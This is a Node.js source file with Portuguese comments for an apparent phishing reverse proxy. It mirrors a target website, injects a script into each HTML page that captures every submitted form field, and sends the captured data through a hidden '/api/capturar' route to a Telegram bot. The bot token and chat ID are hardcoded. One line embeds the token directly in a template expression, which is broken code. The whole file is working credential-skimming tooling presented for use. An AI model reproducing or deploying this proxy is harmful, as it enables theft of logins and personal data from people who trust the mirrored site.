const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const cheerio = require('cheerio');

const app = express();
const PORT = process.env.PORT || 3000;

// Configurações
const TARGET_URL = 'https://example.com'; // Coloque o site desejado
const TELEGRAM_BOT_TOKEN = '8209450971:AAFt1mshdZ9xdXS8rB-263mOAUOc5Fy5XJs';
const TELEGRAM_CHAT_ID = '1004251154302';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Rota invisível de captura
app.post('/api/capturar', async (req, res) => {
    const dados = req.body;
    
    let mensagem = "🚨 *Novos dados capturados!*\n\n";
    for (let [chave, valor] of Object.entries(dados)) {
        mensagem += `*${chave}*: ${valor}\n`;
    }

    try {
        await fetch(`https://api.telegram.org/bot${8209450971:AAFt1mshdZ9xdXS8rB-263mOAUOc5Fy5XJs}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: mensagem,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) {
        console.error("Erro ao enviar para o Telegram:", e);
    }

    res.status(200).json({ status: 'ok' });
});

// Proxy Reverso ajustado para evitar travamento de fluxo (stream)
app.use('/', createProxyMiddleware({
    target: TARGET_URL,
    changeOrigin: true,
    selfHandleResponse: true,
    on: {
        proxyReq: (proxyReq) => {
            // Remove o cabeçalho de compressão para receber o HTML em texto puro sem travar o cheerio
            proxyReq.setRequestHeader('accept-encoding', '');
        },
        onProxyRes: (proxyRes, req, res) => {
            let bodyChunks = [];
            
            proxyRes.on('data', (chunk) => {
                bodyChunks.push(chunk);
            });

            proxyRes.on('end', () => {
                let body = Buffer.concat(bodyChunks).toString('utf-8');
                const contentType = proxyRes.headers['content-type'] || '';

                if (contentType.includes('text/html')) {
                    try {
                        const $ = cheerio.load(body);
                        
                        const scriptInjetado = `
                            <script>
                                document.addEventListener('DOMContentLoaded', () => {
                                    const forms = document.querySelectorAll('form');
                                    forms.forEach(form => {
                                        form.addEventListener('submit', () => {
                                            const formData = new FormData(form);
                                            const dados = {};
                                            formData.forEach((v, k) => { dados[k] = v; });

                                            fetch('/api/capturar', {
                                                method: 'POST',
                                                headers: { 'Content-Type': 'application/json' },
                                                body: JSON.stringify(dados)
                                            }).catch(() => {});
                                        });
                                    });
                                });
                            </script>
                        `;

                        $('body').append(scriptInjetado);
                        body = $.html();
                    } catch (err) {
                        console.error('Erro ao modificar o HTML:', err);
                    }
                }

                // Copia os cabeçalhos originais, ajustando o tamanho do conteúdo
                const headers = { ...proxyRes.headers };
                delete headers['content-length'];
                delete headers['content-encoding'];

                res.writeHead(proxyRes.statusCode, headers);
                res.end(body);
            });
        }
    }
}));

app.listen(PORT, () => console.log(`Proxy rodando na porta ${PORT}`));
